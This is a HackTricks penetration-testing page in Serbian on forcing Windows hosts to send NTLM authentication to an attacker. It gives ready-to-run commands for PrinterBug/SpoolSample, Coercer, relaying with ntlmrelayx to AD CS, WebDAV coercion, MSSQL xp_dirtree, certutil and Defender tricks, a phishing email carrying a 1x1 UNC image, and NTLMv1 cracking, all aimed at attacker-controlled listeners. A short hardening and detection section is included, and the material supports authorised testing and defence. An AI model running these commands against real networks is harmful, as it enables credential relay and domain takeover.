# Prinudna privilegovana NTLM autentifikacija

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) je **kolekcija** **okidača za udaljenu autentifikaciju**, napisana u jeziku C# pomoću MIDL compiler-a radi izbegavanja zavisnosti od third-party komponenti.

## Zloupotreba Spooler servisa

Ako je servis _**Print Spooler**_ **omogućen,** možete koristiti neke već poznate AD kredencijale da od print servera Domain Controller-a **zatražite** ažuriranje o novim poslovima štampanja i jednostavno mu kažete da **pošalje obaveštenje nekom sistemu**.\
Imajte na umu da, kada printer pošalje obaveštenje proizvoljnom sistemu, mora da se **autentifikuje prema** tom **sistemu**. Zbog toga napadač može naterati servis _**Print Spooler**_ da se autentifikuje prema proizvoljnom sistemu, pri čemu će servis u ovoj autentifikaciji **koristiti račun računara**.

U pozadini, klasični primitive **PrinterBug** zloupotrebljava **`RpcRemoteFindFirstPrinterChangeNotificationEx`** preko **`\\PIPE\\spoolss`**. Napadač najpre otvara handle ka printeru/serveru, a zatim prosleđuje lažno ime klijenta u `pszLocalMachine`, zbog čega ciljni spooler kreira kanal za obaveštenja **nazad ka hostu pod kontrolom napadača**. Zato je efekat **prinudna odlazna autentifikacija**, a ne direktno izvršavanje koda.<sup>[[2]](#references)</sup>\
Ako tražite **RCE/LPE** u samom spooler-u, pogledajte [PrintNightmare](printnightmare.md). Ova stranica je fokusirana na **coercion i relay**.

### Pronalaženje Windows servera na domenu

Koristite PowerShell za izlistavanje Windows hostova. Serveri su obično ciljevi najvišeg prioriteta, zato se najpre fokusirajte na njih:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Pronalaženje Spooler servisa koji osluškuju

Koristeći blago izmenjeni [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) autora @mysmartlogin (Vincent Le Toux), proverite da li Spooler Service osluškuje:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Takođe možete koristiti `rpcdump.py` na Linux-u i potražiti **MS-RPRN** protokol:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Ili brzo testirajte hostove sa Linuxa pomoću **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Ako želite da **enumerate coercion surfaces** umesto da samo proverite da li spooler endpoint postoji, koristite **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Ovo je korisno zato što vam prikaz endpointa u EPM-u samo govori da je print RPC interface registrovan. To **ne** garantuje da je svaki coercion method dostupan sa vašim trenutnim privilegijama niti da će host emitovati upotrebljiv authentication flow.

### Zatražite od servisa da se autentifikuje prema proizvoljnom hostu

Možete kompajlirati [SpoolSample odavde](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ili koristite [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ili [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ako ste na Linux-u
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Pomoću **Coercer** možete direktno ciljati spooler interfejse i izbeći nagađanje o tome koja je RPC metoda izložena:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Moderni RPC-over-TCP callback-ovi

Nemojte pretpostaviti da uspešan poziv `RpcRemoteFindFirstPrinterChangeNotificationEx` mora da proizvede saobraćaj na TCP/445. **Windows 11 22H2 i novije verzije podrazumevano koriste RPC over TCP za komunikaciju sa štampačima**; RPC preko named pipes je onemogućen, osim ako ga policy ili `RpcUseNamedPipeProtocol=1` ponovo ne omogući. Zbog toga legacy SMB-only listener-i mogu prijaviti da je trigger poslat, a da nikada ne prime callback. Microsoft dokumentuje TCP/135 (Endpoint Mapper) zajedno sa dinamičkim RPC portovima za uobičajeni print RPC, a organizacije mogu ograničiti ovaj opseg ili izabrati fiksni print RPC port.<sup>[[10]](#references)</sup>

Aktuelni **Impacket `ntlmrelayx.py`** uključuje RPC relay server i mali Endpoint Mapper, koji je podrazumevano omogućen na TCP/135. Ova podrška je dodata u junu 2025. upravo uz demonstrirani PrinterBug-to-AD-CS chain, čime se omogućava relay autentifikovanog RPC callback-a čak i kada se žrtva ne prebacuje na SMB/WebDAV.<sup>[[11]](#references)</sup>
```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
Potražite `Setting up RPC Server on port 135` i `RPCD: Received connection` u izlazu relay-a. Ako RPC poziv vrati očekivanu grešku, ali ništa ne stigne do listener-a, proverite print RPC transport policy žrtve, outbound filtering, DNS resolution i da li neki drugi proces već koristi TCP/135. Takođe proverite da `ntlmrelayx` nije pokrenut sa opcijom `--no-rpc-server`.

### Prisiljavanje HTTP umesto SMB-a sa WebClient

Na sistemima koji i dalje koriste **RPC over named pipes** (legacy builds ili ponašanje vraćeno policy-jem), klasični PrinterBug obično generiše **SMB** authentication ka `\\attacker\share`, što je i dalje korisno za **capture**, **relay to HTTP targets** ili **relay gde SMB signing nije prisutan**.\
Međutim, relaying **SMB to SMB** često blokira **SMB signing**, pa operateri mogu preferirati da umesto toga prisile **HTTP/WebDAV** authentication. Ovo nije fallback za gore opisano RPC-over-TCP ponašanje.

Ako je servis **WebClient** pokrenut na target-u, listener se može navesti u formatu koji primorava Windows da koristi **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Ovo je naročito korisno kada se kombinuje sa **`ntlmrelayx --adcs`** ili drugim HTTP relay targets, jer se tako izbegava oslanjanje na SMB relayability na coerced konekciji. Važna napomena je da **WebClient mora biti pokrenut** na žrtvi da bi HTTP/WebDAV varijanta funkcionisala.

### Kombinovanje sa Unconstrained Delegation

Ako je napadač kompromitovao računar konfigurisan za [Unconstrained Delegation](unconstrained-delegation.md), može **naterati štampač da se autentifikuje na tom računaru**. **TGT** naloga računara štampača se zatim kešira u memoriji na hostu sa unconstrained delegation, gde napadač može da ga preuzme i ponovo upotrebi pomoću [Pass the Ticket](pass-the-ticket.md).

### Napomene o detekciji i hardeningu

Najpouzdaniji način da se PrinterBug ukloni sa DC-a, PAW-a ili servera koji ne štampa jeste zaustavljanje i onemogućavanje Spooler-a. Tamo gde je štampanje neophodno, harden-ujte svaku moguću relay destinaciju (SMB server signing, LDAP signing/channel binding i EPA na HTTP servisima kao što je AD CS), umesto da pretpostavite da je blokiranje TCP/445 na callback putanji dovoljno.<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
Detekcija treba da koreliše autentifikovani poziv ka MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab`, naročito opnum 62/65 sa vrednošću callback-a koja nije lokalna, i neposrednu odlaznu SMB, HTTP ili RPC konekciju sa spooler hosta. Napravite baseline za **interface UUID/opnum i parove izvora/odredišta**, a ne samo za pristup ka `\PIPE\spoolss`, jer aktuelni print stack-ovi mogu da postave callback preko RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (interfejsi/opnum-ovi koji pokreću odlaznu autentifikaciju)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asinhroni print interfejs na istom spooler pipe-u; koristite Coercer za enumeraciju dostupnih metoda na datom hostu<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (takođe preko \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums koji se često zloupotrebljavaju: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Napomena: Ove metode prihvataju parametre koji mogu da sadrže UNC putanju (npr. `\\attacker\share`). Kada ih obradi, Windows će se autentifikovati (u kontekstu mašine/korisnika) na taj UNC, čime se omogućavaju hvatanje ili relay NetNTLM-a.\
Za zloupotrebu spooler-a, **MS-RPRN opnum 65** i dalje predstavlja najčešći i najbolje dokumentovani primitive, jer specifikacija protokola izričito navodi da server kreira notification channel nazad ka client-u navedenom u `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN preko \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target pokušava da otvori navedenu putanju do backup log-a i autentifikujе se na UNC kojim upravlja attacker.<sup>[[1]](#references)</sup>
- Practical use: prisiliti Tier 0 asset-e (DC/RODC/Citrix/itd.) da emituju NetNTLM, a zatim izvršiti relay ka AD CS endpoint-ima (ESC8/ESC11 scenariji) ili drugim privilegovanim servisima.<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` attack je posledica propusta pronađenog u **Exchange Server `PushSubscription` feature-u**. Ovaj feature omogućava da se Exchange server natera da se, od strane bilo kog domain user-a koji ima mailbox, autentifikuje na bilo koji host koji obezbeđuje client, preko HTTP-a.

Podrazumevano, **Exchange service se izvršava kao SYSTEM** i dodeljene su mu prekomerne privilegije (konkretno, ima **WriteDacl privileges na domain-u pre 2019 Cumulative Update-a**). Ovaj propust može da se iskoristi za omogućavanje **relay-a informacija ka LDAP-u i naknadno izdvajanje domain NTDS database**. U slučajevima kada relay ka LDAP-u nije moguć, ovaj propust se i dalje može koristiti za relay i autentifikaciju na druge hostove unutar domain-a. Uspešno iskorišćavanje ovog attack-a omogućava neposredan pristup Domain Admin-u sa bilo kojim autentifikovanim domain user account-om.

## Inside Windows

Ako se već nalazite unutar Windows mašine, možete naterati Windows da se poveže sa serverom koristeći privilegovane account-e pomoću:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ili koristi ovu drugu tehniku: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Moguće je koristiti certutil.exe lolbin (binarni fajl potpisan od strane Microsoft-a) za prisiljavanje NTLM autentikacije:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Ako znate **email adresu** korisnika koji se prijavljuje na mašinu koju želite da kompromitujete, jednostavno mu možete poslati **email sa slikom dimenzija 1x1** kao što je
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Kada je žrtva otvori, Windows pokušava da se autentifikuje.

### MitM

Ako možete da izvršite MitM napad i ubacite HTML u stranicu koju žrtva pregleda, pokušajte da ubacite sliku kao što je:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Drugi načini za force i phish NTLM authentication


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Ako možete da uhvatite [NTLMv1 challenge-e, ovde pročitajte kako da ih crackujete](../ntlm/index.html#ntlmv1-attack).\
_Zapamtite da za crackovanje NTLMv1 morate da podesite Responder challenge na "1122334455667788"_

## References

- [1] [Unit 42 – Authentication Coercion nastavlja da se razvija](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – RPC ažuriranja veze za štampanje u Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – RPC relay server i Endpoint Mapper za ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
{{#include ../../banners/hacktricks-training.md}}
